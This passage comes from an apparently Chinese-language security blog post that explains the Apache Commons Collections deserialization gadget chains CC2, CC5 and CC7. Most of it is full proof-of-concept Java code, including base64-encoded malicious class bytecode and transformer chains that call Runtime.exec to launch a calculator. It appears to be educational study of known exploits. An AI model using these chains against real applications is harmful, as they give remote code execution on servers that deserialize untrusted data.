class_\">Object</span>[]&#123;templates&#125;);</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class=\"line\">                instantiateTransformer</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        <span class=\"type\">TransformingComparator</span> <span class=\"variable\">transformingComparator</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TransformingComparator</span>&lt;&gt;(<span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>&lt;&gt;());</span><br><span class=\"line\">        <span class=\"type\">PriorityQueue</span> <span class=\"variable\">priorityQueue</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        setFieldValue(transformingComparator,<span class=\"string\">&quot;transformer&quot;</span>,chainedTransformer);</span><br><span class=\"line\">        serialize(priorityQueue);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"bU9ibpOg-rJ750zQs3RUFYvdJoieG2kx4pxRn3K0biY.png\" alt=\"image\"></p>\n<h2 id=\"CC2\"><a href=\"#CC2\" class=\"headerlink\" title=\"CC2\"></a>CC2</h2><p>cc2中不通过实例化 TrAXFilter 进行类加载，而是用回InvokerTransformer</p>\n<h3 id=\"方式一\"><a href=\"#方式一\" class=\"headerlink\" title=\"方式一\"></a>方式一</h3><p>先传入一个无效的ConstantTransformer，然后再反射修改为有效的newTransformer</p>\n<p><img src=\"KzWxI9aRAQXX6DV3VegGL9UyMBMUugfFr8ZgeP-dC2U.png\" alt=\"image\"></p>\n<h3 id=\"方式二\"><a href=\"#方式二\" class=\"headerlink\" title=\"方式二\"></a>方式二</h3><p>直接传入有效的newTransformer，templates通过add传入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain4;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/8/15</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 20:38</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC2</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAJAcAFgoAAQAXCgAHABcKABgAGQgAGgoAGAAbBwAcAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAHgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYBAApTb3VyY2VGaWxlAQAOQnl0ZUNsYXNzLmphdmEBACFjb20vZ2FyY2szaC9jbGFzc2xvYWRlci9CeXRlQ2xhc3MMABIAEwcAHwwAIAAhAQAEY2FsYwwAIgAjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEAAQAHAAAAAAAEAAkACAAJAAIACgAAACUAAgACAAAACbsAAVm3AAJMsQAAAAEACwAAAAoAAgAAAA0ACAAOAAwAAAAEAAEADQABAA4ADwACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEgAMAAAABAABABAAAQAOABEAAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABcADAAAAAQAAQAQAAEAEgATAAIACgAAAC4AAgABAAAADiq3AAO4AAQSBbYABlexAAAAAQALAAAADgADAAAAGAAEABkADQAaAAwAAAAEAAEADQABABQAAAACABU&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\">        <span class=\"type\">InvokerTransformer</span> <span class=\"variable\">newTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;newTransformer&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">TransformingComparator</span> <span class=\"variable\">transformingComparator</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TransformingComparator</span>(newTransformer);</span><br><span class=\"line\">        <span class=\"type\">PriorityQueue</span> <span class=\"variable\">priorityQueue</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class=\"line\">        priorityQueue.add(templates);</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;size&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"sPF-nFdWKQ35YM0CZzzMgkR9ApezY6tIG4R6JkydTFI.png\" alt=\"image\"></p>\n<p>CC2利用链（红色连线）</p>\n<p><img src=\"BdRv3YhWHe5scOfHQ8KSMc9a1r_2ki3yYk4NAsLI93c.png\" alt=\"image\"></p>\n<h2 id=\"CC5\"><a href=\"#CC5\" class=\"headerlink\" title=\"CC5\"></a>CC5</h2><p>cc5和cc6也差不多，只是修改了入口类，然后还是调用的LazyMap的get</p>\n<p>利用链如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Gadget chain:</span><br><span class=\"line\">        ObjectInputStream.readObject()</span><br><span class=\"line\">            BadAttributeValueExpException.readObject()</span><br><span class=\"line\">                TiedMapEntry.toString()</span><br><span class=\"line\">                    LazyMap.get()</span><br><span class=\"line\">                        ChainedTransformer.transform()</span><br><span class=\"line\">                            ConstantTransformer.transform()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Class.getMethod()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Runtime.getRuntime()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>\n<p>在BadAttributeValueExpException的readObject中，会根据传入的valObj，调用其toString方法</p>\n<p><img src=\"nCmBb66aDkODCeUHyEmlUtS2VkDm-3YODhN_gnYACgs.png\" alt=\"image\"></p>\n<p>我们可以通过反射直接修改其valObj为tiedMapEntry，那不就妥妥的和cc6一样了吗，当然valObj是从val赋值得来的。所以</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">BadAttributeValueExpException</span> <span class=\"variable\">badAttributeValueExpException</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BadAttributeValueExpException</span>(<span class=\"literal\">null</span>);</span><br><span class=\"line\">setFieldValue(badAttributeValueExpException,<span class=\"string\">&quot;val&quot;</span>,tiedMapEntry);</span><br></pre></td></tr></table></figure>\n<p>完整的poc为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain4;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/8/15</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 21:06</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC5</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        Map&lt;Object, Object&gt; decorate = LazyMap.decorate(hashedMap, chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">TiedMapEntry</span> <span class=\"variable\">tiedMapEntry</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TiedMapEntry</span>(decorate,<span class=\"string\">&quot;123&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">BadAttributeValueExpException</span> <span class=\"variable\">badAttributeValueExpException</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BadAttributeValueExpException</span>(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(badAttributeValueExpException,<span class=\"string\">&quot;val&quot;</span>,tiedMapEntry);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(badAttributeValueExpException);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"GypuU-H-YGyDt7Z2cU9OaDjslgkbrfkjvAyNfTgRRnQ.png\" alt=\"image\"></p>\n<h2 id=\"CC7\"><a href=\"#CC7\" class=\"headerlink\" title=\"CC7\"></a>CC7</h2><p>利用链为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Payload method chain:</span><br><span class=\"line\">   java.util.Hashtable.readObject</span><br><span class=\"line\">   java.util.Hashtable.reconstitutionPut</span><br><span class=\"line\">   org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class=\"line\">   java.util.AbstractMap.equals</span><br><span class=\"line\">   org.apache.commons.collections.map.LazyMap.get</span><br><span class=\"line\">   org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class=\"line\">   org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class=\"line\">   java.lang.reflect.Method.invoke</span><br><span class=\"line\">   sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class=\"line\">   sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class=\"line\">   sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class=\"line\">   java.lang.Runtime.exec</span><br></pre></td></tr></table></figure>\n<p>看到利用链，我们直接去看Hashtable的readObject；发现调用了reconstitutionPut</p>\n<p><img src=\"8l-u-M432CPP-mmYhi4QUfBecUD6wfPzyeKaVAooqgc.png\" alt=\"image\"></p>\n<p>我们跟进去看看，发现这里调用了调用了 equls 方法。</p>\n<p><img src=\"yUWQSJ_PB4Ou0bd16rpNEXKYZeBtgeA1qTJsY7lW_AU.png\" alt=\"image\"></p>\n<p>直接查看调用，发现太多了。</p>\n<p><img src=\"eEQw-xF3Vh_jn7DZ-50F1yYQr08fugzsbenXgS9tvsA.png\" alt=\"image\"></p>\n<p>我们查看上诉利用链知道这是AbstractMapDecorator 类的 equals 方法。其功能大致是用于判断当前对象是否与给定的对象相等。如果两个对象不是同一个对象，调用map.equals(object)方法。</p>\n<p><img src=\"K8QK6fhZgKPkLoczAGSgUuDU8jlA57aAnkBfEb-XQsY.png\" alt=\"image\"></p>\n<p>它可以return一个equals，那么我们再根据利用链来到 AbstractMap 类，查看其 equals 方法。在469行中，调用了get方法，若把这里的m构造为LazyMap 对象，就可以接着使用我们之前的利用链了。</p>\n<p><img src=\"QyP7TQh2drFgslAX6BsF2aWzuKMkdxARTfwktLL_ypg.png\" alt=\"image\"></p>\n<p>下面我们来构造一下，看看需要什么条件，首先看回Hashtable的readObject。在1173中对elements进行赋值为2</p>\n<p><img src=\"FnAyiTdPzTwkPvRai5xuWGlvCKAv8bBO6n6BiyU9bjs.png\" alt=\"image\"></p>\n<p>那就意味着下面会进行两次遍历，调用了两次reconstitutionPut</p>\n<p><img src=\"ndcbPV-EKLi4VoQ8CVCLFx0Z09yRDE8sLxAd7U8gDJI.png\" alt=\"image\"></p>\n<p>这段代码用于遍历哈希表中某个桶（bucket）的链表，并检查是否存在重复键值的代码段。第一次执行的时候会获取key的hash值与tab里面的hash进行对比，我们可以看到此时的tab.length为0，也就是说是空的，所以跳过了for循环，直接就来到了1227行，然后就是把这个key的hash放入到tab中。</p>\n<p><img src=\"ZoK5-9gsRgYq6BHhF7Jkoky9JlbSLv8UIml_6U9MHuc.png\" alt=\"image\"></p>\n<p>第二次执行reconstitutionPut的时候，执行1221行的if判断时，需要与上一次计算的hash相等，才执行后面的e.key.equals。</p>\n<p>那么我们可以构造两个相同的hash结果一样的键传入，就是我们讲的hash碰撞的问题。如</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashCode(<span class=\"string\">&#x27;Aa&#x27;</span>) == hashCode(<span class=\"string\">&#x27;BB&#x27;</span>)</span><br><span class=\"line\">hashCode(<span class=\"string\">&#x27;CC&#x27;</span>) == hashCode(<span class=\"string\">&#x27;Bb&#x27;</span>)</span><br><span class=\"line\">hashCode(<span class=\"string\">&#x27;DD&#x27;</span>) == hashCode(<span class=\"string\">&#x27;Cc&#x27;</span>)</span><br><span class=\"line\">hashCode(<span class=\"string\">&#x27;BBBB&#x27;</span>) == hashCode(<span class=\"string\">&#x27;BBAa&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>我们这里直接使用hashCode(‘Aa’) &#x3D;&#x3D; hashCode(‘BB’)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Map</span> <span class=\"variable\">Map1</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>();</span><br><span class=\"line\"><span class=\"type\">Map</span> <span class=\"variable\">Map2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Map</span> <span class=\"variable\">lazyMap1</span> <span class=\"operator\">=</span> LazyMap.decorate(Map1,chainedTransformer);</span><br><span class=\"line\">lazyMap1.put(<span class=\"string\">&quot;Aa&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Map</span> <span class=\"variable\">lazyMap2</span> <span class=\"operator\">=</span> LazyMap.decorate(Map2, chainedTransformer);</span><br><span class=\"line\">lazyMap2.put(<span class=\"string\">&quot;BB&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"type\">Hashtable</span> <span class=\"variable\">hashtable</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Hashtable</span>();</span><br><span class=\"line\">hashtable.put(lazyMap1, <span class=\"number\">1</span>);</span><br><span class=\"line\">hashtable.put(lazyMap2, <span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<p>最终完整的POC为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain4;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/8/15</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 21:56</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span 